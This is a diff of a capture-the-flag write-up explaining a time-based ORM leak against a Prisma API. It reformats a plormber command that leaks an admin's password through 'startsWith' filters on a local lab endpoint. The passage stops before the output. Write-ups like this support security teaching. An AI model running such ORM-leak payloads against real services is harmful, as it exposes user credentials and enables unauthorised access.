@@ -4,7 +4,16 @@
 
 In this challenge, since we do not have access to the output, we have to use a time-based attack. It is a bit harder to use with an ORM, but it is still possible using big queries and statistical analysis. The tool [`plormber`](https://github.com/elttam/plormber) can do it for us.
 
-Here's the command line: `plormber prisma-contains --base-query-json '{"where":{PAYLOAD}}' --leak-query-json '{"clowns":{"some":{"clown":{"password":{"startsWith":"{ORM_LEAK}"}}}}}' --contains-payload-json '{"body":{"contains":"{RANDOM_STRING}"}}' --verbose-stats http://127.0.0.1:5002/api/article`
+Here's the command line: 
+```bash
+plormber prisma-contains \
+  --verbose-stats \
+  --dumped-prefix flag- \
+  --base-query-json '{"where":{PAYLOAD}}' \
+  --leak-query-json '{"clowns":{"some":{"clown":{"isAdmin":true,"password":{"startsWith":"{ORM_LEAK}"}}}}}' \
+  --contains-payload-json '{"body":{"contains":"{RANDOM_STRING}"}}' \
+  http://127.0.0.1:5002/api/article
+```
 
 Output example with the flag.
 ```
